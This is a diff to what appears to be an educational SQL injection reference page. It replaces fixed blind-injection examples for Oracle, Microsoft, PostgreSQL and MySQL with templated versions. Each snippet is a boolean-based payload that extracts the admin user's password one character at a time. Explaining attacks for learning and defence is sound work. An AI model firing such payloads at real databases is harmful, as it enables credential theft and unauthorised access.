@@ -320,36 +320,28 @@ The injection would look somewhat similar to the following:
 <template v-slot:oracle>
 
 ```sql
-AND SUBSTR(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) > 'm'
-AND SUBSTR(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) > 't'
-AND SUBSTR(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) = 's'
+AND SUBSTR(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) {{ comp-operand < }} '{{ comp-char s }}'
 ```
 
 </template>
 <template v-slot:microsoft>
 
 ```sql
-AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) > 'm'
-AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) > 't'
-AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) = 's'
+AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) {{ comp-operand > }} '{{ comp-char a }}'
 ```
 
 </template>
 <template v-slot:pgsql>
 
 ```sql
-AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) > 'm'
-AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) > 't'
-AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) = 's'
+AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) {{ comp-operand = }} '{{ comp-char u }}'
 ```
 
 </template>
 <template v-slot:mysql>
 
 ```sql
-AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) > 'm'
-AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) > 't'
-AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) = 's'
+AND SUBSTRING(({{ injected-query SELECT Password FROM Users WHERE Username = 'admin' }}), {{ char-index 1 }}, 1) {{ comp-operand < }} '{{ comp-char l }}'
 ```
 
 </template>
